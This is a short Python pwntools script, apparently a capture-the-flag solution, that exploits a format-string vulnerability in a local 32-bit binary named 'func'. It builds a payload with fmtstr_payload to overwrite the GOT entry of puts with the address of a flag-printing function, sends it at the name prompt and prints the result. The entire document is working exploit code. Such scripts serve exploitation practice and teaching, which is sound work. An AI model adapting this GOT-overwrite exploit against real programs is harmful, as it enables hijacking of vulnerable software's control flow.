from pwn import *


offset = 7
GOT_PUTS = 0x804c010
GOT_FLAG = 0x80491a6

context(arch='i386', os='linux')
p = process('./func')

p.recvuntil(b'Enter your name: ')
p.clean()
payload = fmtstr_payload(offset, {GOT_PUTS: GOT_FLAG})
p.sendline(payload)
print(p.recvline())
print(p.recvline())
